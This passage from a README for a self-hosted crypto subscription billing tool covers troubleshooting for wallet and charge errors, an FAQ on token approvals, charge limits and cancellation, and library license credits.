| Deploy page shows a wallet error | Read the message: usually not enough gas, wrong network in the wallet, or a busy wallet RPC (change the network's RPC in MetaMask). |
| Charge failed: over per-charge / 30-day limit | The customer's own limits. Charge less or later. |
| Charge failed: token transfer failed | The customer's balance or approval is too low. |
| Charge failed: insufficient funds / not enough energy | Send gas (BNB, POL, ETH, TRX or SOL) to that network's keeper. |
| A new customer isn't listed | Wait a minute, or **Add customer** with the wallet address. |
| Telegram test fails | Check the token, press Start in the bot, **Find my chat** again. |
| Bot says "This bot is private" | Your chat isn't the saved Chat ID: **Find my chat**, or add your user ID (`/id`) as an extra admin. |
| Bot doesn't answer | Admin → Telegram shows the bot status. "Conflict" = another server or a webhook uses the same token. |

---

## 18. FAQ

**Can customers pay from an exchange account?**
No. Autopay needs an approval signed from a self-custody wallet (Trust Wallet, Binance Web3 Wallet, MetaMask…). Exchange accounts can't approve contracts.

**Trust Wallet opens on Ethereum. Do customers have to switch?**
No. The page moves the wallet to BNB Smart Chain as soon as it opens, and the Approve button checks again before sending.

**Is anything charged automatically?**
No. You start every charge (admin panel, Telegram, or your own scheduled call to the admin API).

**Can I charge more than the customer approved?**
No. The contract refuses it.

**Can a customer stop paying?**
Yes, at any time: cancel on the billing page or revoke the approval in the wallet. Your service then stops serving them (`check` returns `ok: false`), and unpaid usage stays as "due".

**Do I need to run a blockchain node?**
No. Public RPCs work; your own RPC endpoint is recommended for reliability.

---

## 19. Credits and licenses

Built with these open-source libraries, each under its own license (see `node_modules/<package>/LICENSE` after `npm install`):

| Library | License |
|---|---|
| Express, ethers, Vite, wagmi, viem, TanStack Query, qrcode | MIT |
| dotenv | BSD-2-Clause |
| **Reown AppKit** (`@reown/appkit`, wallet connection on the billing page) | **Reown Community License** (not MIT) |

**Reown AppKit notice.** Portions © 2025 Reown, Inc. All Rights Reserved. AppKit is used under the Reown Community License (`site/node_modules/@reown/appkit/LICENSE.md` after installing). Free use has monthly limits (at the time of writing: 500 monthly active users or 2,500,000 RPC calls); above them Reown requires a paid commercial license. Read the license before going live and keep this notice in your product.

The Solidity contracts in `contracts/` are MIT licensed (see the SPDX header in each file).

Fonts on the billing page (Bricolage Grotesque, Figtree) are loaded from Google Fonts under the SIL Open Font License.

**Support:** _add your support contact or support page here._
